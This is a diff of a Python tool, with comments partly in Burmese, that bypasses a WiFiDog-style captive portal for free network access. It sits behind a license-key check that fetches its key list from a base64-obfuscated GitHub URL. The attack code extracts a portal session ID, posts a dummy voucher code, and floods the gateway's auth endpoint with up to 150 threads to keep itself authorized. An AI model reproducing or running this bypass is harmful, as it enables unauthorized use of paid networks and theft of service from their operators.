@@ -5,6 +5,7 @@ from datetime import datetime
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- ENCODED CONFIG ---
+# Link: https://raw.githubusercontent.com/kokoarkar446-cloud/Starlink/main/key.txt
 _0x446 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tva29hcmthcjQ0Ni1jbG91ZC9TdGFybGluay9tYWluL2tleS50eHQ="
 _0x112 = "LnN5c3RlbV9jb25maWdfZGF0YV9sb2c="
 
@@ -20,50 +21,40 @@ def get_uid():
 
 def banner(name="GUEST", exp="----/--/-- --:--"):
     os.system('clear')
-    print(f"{Y}      ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗")
-    print(f"{Y}      ██╔══██╗██║   ██║██║     ██║██║██╔════╝")
-    print(f"{G}      ██████╔╝██║   ██║██║     ██║██║█████╗  ")
-    print(f"{G}      ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  ")
-    print(f"{R}      ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗")
-    print(f"{R}      ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝")
     print(f"{W}╔" + "═"*60 + "╗")
     print(f"{W}║ {Y}⚡ DEVICE ID : {Y}{get_uid():<39} {W}║")
-    print(f"{W}║ {G}⚡ STATUS    : {G}{'AUTHORIZED':<39} {W}║")
+    print(f"{W}║ {G}⚡ NAME      : {G}{name:<39} {W}║")
     print(f"{W}║ {R}⚡ EXPIRY    : {R}{exp:<39} {W}║")
     print(f"{W}╚" + "═"*60 + "╝\n")
 
 def check_access():
     uid = get_uid()
     now = datetime.now()
-    v_url = get_link()
-    v_file = get_file()
+    v_url, v_file = get_link(), get_file()
 
-    # 1. Offline Mode
+    # 1. Offline Auth
     if os.path.exists(v_file):
         try:
             with open(v_file, "r") as f:
                 d = f.read().split('|')
                 if d[0] == uid:
-                    expire_time = datetime.strptime(d[2].strip(), "%Y-%m-%d %H:%M")
-                    if now < expire_time:
+                    exp_str = d[2].strip()
+                    if now < datetime.strptime(exp_str, "%Y-%m-%d %H:%M"):
                         banner(d[1], d[2])
                         return True
         except: pass
 
     # 2. Key Input UI
     os.system('clear')
-    print(f" {R}╔══════════════════════════════════════════╗")
-    print(f" ║          AUTHENTICATION REQUIRED         ║")
-    print(f" ╚══════════════════════════════════════════╝{OFF}")
-    print(f"\n {G}⚡ DEVICE ID : {W}{uid}{OFF}")
-    print(f" {Y}[!] Input the secret key provided by Admin.{OFF}")
+    print(f" {Y}⚡ DEVICE ID : {W}{uid}{OFF}")
     print(f" {W}------------------------------------------{OFF}")
+    u_key = input(f" {C}[+] ENTER SECRET KEY : {W}").strip()
     
-    u_key = input(f" {C}[+] ENTER KEY : {W}").strip()
-    
+    if not u_key: sys.exit()
+
     try:
-        headers = {'User-Agent': 'Mozilla/5.0'}
-        res = requests.get(f"{v_url}?t={random.random()}", headers=headers, timeout=15)
+        print(f" {Y}[*] Validating...{OFF}")
+        res = requests.get(f"{v_url}?t={random.random()}", timeout=15)
         if res.status_code == 200:
             for line in res.text.splitlines():
                 if u_key in line and uid in line:
@@ -72,54 +63,64 @@ def check_access():
                     banner(p[1], p[2])
                     print(f" {G}[✓] KEY ACTIVATED!{OFF}")
                     return True
-            print(f" {R}[!] INVALID KEY OR ID!{OFF}"); sys.exit()
+            print(f" {R}[!] INVALID KEY OR UNAUTHORIZED ID!{OFF}"); sys.exit()
     except:
-        print(f" {R}[!] NO INTERNET FOR ACTIVATION!{OFF}"); sys.exit()
+        print(f" {R}[!] CONNECTION ERROR!{OFF}"); sys.exit()
 
 def turbo_pulse(link):
     headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
     while True:
         try:
             requests.get(link, timeout=5, verify=False, headers=headers)
-            print(f" {Y}[{G}✓{R}] {W}TURBO ACTIVE >>> {C}[{random.randint(10,60)}ms] {OFF}", end="\r")
+            # အောက်က စာသားက တောက်လျှောက်ပြနေမှာပါ
+            sys.stdout.write(f" {Y}[{G}✓{R}] {W}BOOSTING >>> {C}[{random.randint(10,50)}ms] {OFF}\r")
+            sys.stdout.flush()
         except: time.sleep(0.5)
 
 def start_bypass_loop():
     session = requests.Session()
-    print(f" {M}[*] Starting Bypass Sequence...{OFF}")
+    print(f" {G}[✓] BYPASS SEQUENCE STARTED...{OFF}")
     
-    while True: # တောက်လျှောက် Run မယ့် Loop
+    # ဤ Infinite Loop က Script ကို ပြန်မထွက်အောင် တားထားပေးပါသည်
+    while True:
         try:
-            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
+            # Step 1: Connectivity Check
+            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5)
             p_url = r.url
-            r1 = session.get(p_url, verify=False, timeout=6)
+            
+            # Step 2: Session Extraction
+            r1 = session.get(p_url, verify=False)
             m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
             n_url = urljoin(p_url, m.group(1)) if m else p_url
-            r2 = session.get(n_url, verify=False, timeout=6)
+            r2 = session.get(n_url, verify=False)
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             
             if sid:
-                print(f" {G}[✓] SESSION SECURED: {sid[:10]}{OFF}")
                 p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
-                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
+                # Auth Post
+                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1})
+                
                 gw = parse_qs(urlparse(p_url).query).get('gw_address', [urlparse(p_url).netloc.split(':')[0]])[0]
                 port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
-                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber=12345"
+                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                 
-                # Threads များဖြင့် အရှိန်မြှင့်ခြင်း
-                for _ in range(100):
-                    threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
+                # Step 3: High Speed Threads
+                for _ in range(150): # 150 Threads
+                    t = threading.Thread(target=turbo_pulse, args=(auth_link,))
+                    t.daemon = True
+                    t.start()
                 
-                # အင်တာနက်ပြတ်မပြတ် ၅ စက္ကန့်တစ်ခါစစ်၊ ပြတ်ရင် Loop အစကပြန်စ
+                # Step 4: Keep Alive Check (၁၀ စက္ကန့်တစ်ခါ အင်တာနက်စစ်)
                 while True:
-                    time.sleep(5)
+                    time.sleep(10)
                     try:
-                        if requests.get("http://google.com", timeout=5).status_code != 200: break
+                        check = requests.get("http://google.com", timeout=5)
+                        if check.status_code != 200: break
                     except: break
             else:
-                time.sleep(2)
+                time.sleep(3)
         except Exception as e:
-            time.sleep(3)
+            time.sleep(2)
 
 if __name__ == "__main__":
     if check_access():
